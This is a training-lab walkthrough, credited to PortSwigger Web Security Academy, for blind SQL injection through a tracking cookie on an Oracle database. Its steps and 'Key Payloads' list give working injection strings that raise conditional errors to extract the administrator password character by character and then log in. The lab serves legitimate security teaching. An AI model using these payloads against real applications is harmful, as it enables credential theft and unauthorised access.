## Blind SQL injection with conditional errors

**Category:** sqli
**Difficulty:** Medium

### Description
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The database is Oracle.

### Solution Steps
1. Identify the injection point in the TrackingId cookie
2. Test for SQL injection: `TrackingId=xyz'` causes error, `TrackingId=xyz''` works (confirms injection)
3. Confirm Oracle database: `'||(SELECT '' FROM dual)||'` returns normal response
4. Test error-based blind injection: use CASE to trigger errors conditionally
5. Payload that errors on true: `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
6. Payload that succeeds on false: `'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
7. Confirm users table: `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1)||'`
8. Check administrator exists: `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
9. Extract password length: iterate with `LENGTH(password)>N` until error stops
10. Extract password char-by-char: `SUBSTR(password,1,1)='a'` - error means true
11. Build full password by iterating through positions and characters
12. Login as administrator with extracted password

### Key Payloads
- `users`
- `username`
- `password`
- `administrator`
- `TrackingId`
- `TrackingId=xyz'`
- `TrackingId=xyz''`
- `'||(SELECT '' FROM dual)||'`
- `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
- `'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

### Indicators of Success
- Single quote causes 500 error, double quote works
- Oracle dual table query succeeds
- Conditional errors trigger based on boolean conditions
- Password extracted character by character
- Administrator login successful

---
*Source: PortSwigger Web Security Academy*
